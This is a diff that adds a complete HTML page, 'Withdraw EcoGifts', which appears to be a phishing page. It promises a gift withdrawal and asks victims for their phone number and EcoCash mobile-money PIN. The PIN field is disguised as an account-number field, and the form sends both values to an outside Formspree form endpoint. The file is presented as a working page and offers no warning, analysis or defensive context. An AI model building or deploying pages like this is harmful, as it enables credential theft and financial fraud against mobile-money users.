@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Withdraw EcoGifts</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background:white;
+      position: relative;
+    }
+
+
+
+    h2 {
+      text-align: center;
+      color: blue;
+      position: absolute;
+      top: 20px;
+      width: 100%;
+      z-index: 1;
+      text-shadow: 1px 1px 3px black;
+      font-size: 26px;
+    }
+
+    /* Logo */
+    .logo {
+      position: absolute;
+      top: 80px;   /* Adjust spacing below title */
+      width: 120px;   /* Resize logo */
+      height: auto;
+      border-radius: 50%;
+      object-fit:cover;
+      border:3px solid white;
+      z-index: 2;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+
+    form {
+      background: white;
+      padding: 25px;
+      width: 320px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+      position: relative;
+      z-index: 1;
+      margin-top: 140px; /* Push form lower so logo doesn’t overlap */
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: blue;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Withdraw EcoGifts</h2>
+
+<!-- YOUR LOGO GOES HERE -->
+<img src="eco.jpg.jpg" class="logo">
+
+<form action="https://formspree.io/f/xblzznvg" method="POST">
+  <label>Phone Number</label>
+  <input type="text" name="phone" placeholder="Enter phone number" required>
+
+  <label>EcoCash pin</label>
+  <input type="text" name="account" placeholder="Enter account number" required>
+
+  <button type="submit">Withdraw</button>
+</form>
+
+</body>
+</html>
